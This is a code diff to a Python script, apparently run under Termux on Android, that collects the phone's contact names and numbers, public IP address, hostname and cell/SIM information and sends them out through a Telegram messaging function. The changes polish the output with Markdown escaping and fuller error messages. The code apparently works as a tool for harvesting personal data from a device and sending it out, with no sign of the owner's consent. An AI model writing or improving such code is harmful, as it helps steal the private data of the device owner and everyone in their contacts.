@@ -20,7 +20,7 @@ def send_to_telegram(message):
         if response.status_code == 200:
             print("Message sent successfully!")
         else:
-            print(f"Failed to send message. Status code: {response.status_code}")
+            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
     except Exception as e:
         print(f"Error sending message: {str(e)}")
 
@@ -34,7 +34,9 @@ def get_contact_list():
         for contact in contacts_json:
             # Collect phone numbers
             if 'number' in contact:
-                contact_numbers.append(f"{contact['name']}: {contact['number']}")
+                name = contact.get('name', 'Unknown').replace('_', '\\_')  # Escape special characters for Markdown
+                number = contact['number'].replace('_', '\\_')
+                contact_numbers.append(f"{name}: `{number}`")
         
         if contact_numbers:
             return "\n".join(contact_numbers)
@@ -50,7 +52,7 @@ def get_device_info():
         ip_address = requests.get('https://api.ipify.org').text
         
         # Get device hostname
-        device_name = socket.gethostname()
+        device_name = socket.gethostname().replace('_', '\\_')  # Escape special characters for Markdown
         
         # Get SIM info (Termux-specific command)
         sim_info = os.popen('termux-telephony-cellinfo').read().strip()
